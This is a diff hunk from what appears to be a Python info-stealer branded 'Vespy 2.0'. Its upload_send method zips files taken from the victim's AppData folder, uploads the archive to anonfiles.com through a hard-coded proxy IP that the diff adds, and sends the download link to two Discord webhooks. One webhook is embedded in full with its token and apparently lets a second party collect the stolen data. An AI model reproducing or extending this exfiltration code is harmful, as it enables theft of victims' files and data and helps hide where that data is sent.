@@ -35,7 +35,10 @@ class Files:
     
     def upload_send(self):
         self.ZIP.close()
-        file = requests.post('https://api.anonfiles.com/upload',files={'file':open(f"C:\\Users\\{user}\\AppData\\Files.zip","rb")})
+        proxies = {
+            'https': '38.170.97.205:8080'
+        }
+        file = requests.post('https://api.anonfiles.com/upload', proxies=proxies, files={'file':open(f"C:\\Users\\{user}\\AppData\\Files.zip","rb")})
         link = file.json()['data']['file']['url']['full']
         dual = r'https://discord.com/api/webhooks/1086774409051770910/C2ft6LFhqdTpsb51sISp2NMxOZCQwM7Mgq946cqN3v4uqbVWSHoawsEithGR4q1xc8kk'
         webhook1, webhook2 = DiscordWebhook.create_batch(urls=[wbh, dual], username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
